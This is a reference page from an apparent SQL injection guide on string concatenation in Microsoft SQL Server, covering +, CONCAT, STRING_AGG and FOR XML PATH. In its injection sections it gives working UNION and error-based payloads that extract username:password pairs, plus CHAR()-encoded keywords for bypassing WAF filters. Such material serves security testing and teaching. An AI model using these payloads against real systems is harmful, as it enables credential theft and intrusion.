---
title: String Concatenation
description: Methods for string concatenation in MSSQL
category: Injection Techniques
order: 9
tags: ["string operations", "concatenation", "T-SQL"]
lastUpdated: 2026-10-08
---

String concatenation is an essential technique for SQL injection in Microsoft SQL Server, allowing attackers to construct complex queries and bypass security filters. MSSQL provides several methods for concatenating strings.

## Using the + Operator

The most common method for string concatenation in SQL Server is the `+` operator:

```sql
SELECT 'a' + 'b' + 'c';  -- Returns: 'abc'
```

If any operand is NULL, the result will be NULL unless you use ISNULL or COALESCE:

```sql
SELECT 'a' + NULL + 'c';  -- Returns: NULL
SELECT 'a' + ISNULL(NULL, '') + 'c';  -- Returns: 'ac'
```

## Using the || Operator (SQL Server 2025+)

SQL Server 2025 accepts the ANSI `||` operator for concatenation. Earlier versions reject it with `Incorrect syntax near '|'`, so it also tells 2025 apart from older versions:

```sql
SELECT 'a' || 'b';  -- Returns: 'ab' on 2025, syntax error before
```

## Using CONCAT() Function (SQL Server 2012+)

The `CONCAT()` function handles NULL values automatically:

```sql
SELECT CONCAT('a', 'b', 'c');  -- Returns: 'abc'
SELECT CONCAT('a', NULL, 'c');  -- Returns: 'ac'
```

## Using CONCAT_WS() Function (SQL Server 2017+)

`CONCAT_WS()` (Concatenate With Separator) joins strings with a specified separator:

```sql
SELECT CONCAT_WS(',', 'a', 'b', 'c');  -- Returns: 'a,b,c'
SELECT CONCAT_WS(',', 'a', NULL, 'c');  -- Returns: 'a,c'
```

## Using STRING_AGG() Function (SQL Server 2017+)

For aggregating multiple rows into a single string:

```sql
SELECT STRING_AGG(name, ',') FROM sys.databases;
-- Returns: 'master,tempdb,model,msdb,...'
```

## Using FOR XML PATH (SQL Server 2005+)

Before STRING_AGG, this was the common method for aggregating strings. `FOR XML PATH('')` entity-encodes `&`, `<` and `>` in the result (`&amp;`, `&lt;`, `&gt;`):

```sql
SELECT STUFF((
    SELECT ',' + name
    FROM sys.databases
    FOR XML PATH('')
), 1, 1, '');
```

## Practical SQL Injection Examples

### Building Dynamic Queries

```sql
-- Creating a dynamic query string
DECLARE @sql nvarchar(500)
SET @sql = 'SELECT * FROM ' + 'users' + ' WHERE id = ' + '1'
EXEC(@sql)
```

The injection examples below target a string parameter (`'`). UNION payloads written as `NULL, <value>, NULL` assume a host query with three columns whose second column is a string; adjust the `NULL`s to the real column count.

### Data Extraction with Concatenation

```sql
-- UNION attack with concatenated output (all rows in one value)
' UNION SELECT NULL, (SELECT username + ':' + password FROM users FOR XML PATH('')), NULL--
```

### Error-based Extraction

```sql
-- Error-based extraction using concatenation (the conversion error shows the value)
' AND 1=CONVERT(int, (SELECT TOP 1 username + ':' + password FROM users))--
```

### Concatenating Multiple Columns

```sql
-- Combining multiple columns into one string
' UNION SELECT NULL, username + ' ' + name + ' (' + email + ')', NULL FROM users--
```

## Advanced Concatenation Techniques

### Type Conversion in Concatenation

When concatenating non-string data types, explicit conversion is recommended:

```sql
-- Concatenating string with integer
SELECT 'User ID: ' + CAST(id AS nvarchar(10)) FROM users

-- Without CAST, + tries to convert the string to int and fails:
-- SELECT 'User ID: ' + id FROM users  -> Conversion failed ...

-- Alternative using CONCAT (handles conversions automatically)
SELECT CONCAT('User ID: ', id) FROM users
```

### Character Building

Building strings character by character using ASCII values:

```sql
SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)  -- Returns: 'admin'
```

### Nested Concatenation

Using nested concatenation for complex strings:

```sql
SELECT 'SELECT * FROM ' + (SELECT DB_NAME()) + '.' + 'users'
```

### Unicode Considerations

For internationalization, use N prefix and NCHAR():

```sql
SELECT N'Unicode: ' + NCHAR(9731)  -- Returns: 'Unicode: ☃'
```

## Handling NULL Values

NULL handling is critical in string concatenation:

```sql
-- Using ISNULL
SELECT 'Name: ' + ISNULL(name, 'Unknown') FROM users

-- Using COALESCE (returns the first non-NULL argument)
SELECT COALESCE(name, email, username, 'Unknown') FROM users

-- Using NULLIF and ISNULL together
SELECT 'Username: ' + ISNULL(NULLIF(username, ''), 'Not Provided') FROM users
```

## Concatenation in SQL Injection Attacks

### Bypassing WAF Filters

```sql
-- Breaking up keywords
SELECT CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84)  -- Builds: 'SELECT'

-- With dynamic execution
DECLARE @cmd varchar(100)
SET @cmd = CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(102) + CHAR(114) + CHAR(111) + CHAR(109) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115)
-- @cmd = 'select * from users'
EXEC(@cmd)
```

### Extracting Multiple Values

```sql
-- Combining multiple rows into one result using STRING_AGG (SQL Server 2017+)
' UNION SELECT NULL, STRING_AGG(username + ':' + password, ','), NULL FROM users--

-- For SQL Server 2005-2016 using FOR XML PATH
' UNION SELECT NULL, (SELECT username + ':' + password + ',' FROM users FOR XML PATH('')), NULL--
```

## Limitations and Considerations

1. `varchar(n)` holds up to 8,000 bytes and `nvarchar(n)` up to 4,000 byte-pairs; `varchar(max)` and `nvarchar(max)` hold up to 2 GB. Concatenating only non-`max` values is truncated at 8,000 bytes, so `CAST` one operand to `varchar(max)` for long results
2. `STRING_AGG` returns `nvarchar(4000)`/`varchar(8000)` for non-`max` input and fails when the result is longer; use `STRING_AGG(CAST(col AS nvarchar(max)), ',')`
3. `+` with a number converts the string to the number type (data type precedence) and fails unless you `CAST` the number
4. `CONCAT` needs SQL Server 2012+, `CONCAT_WS` and `STRING_AGG` need 2017+, `FOR XML PATH` needs 2005+
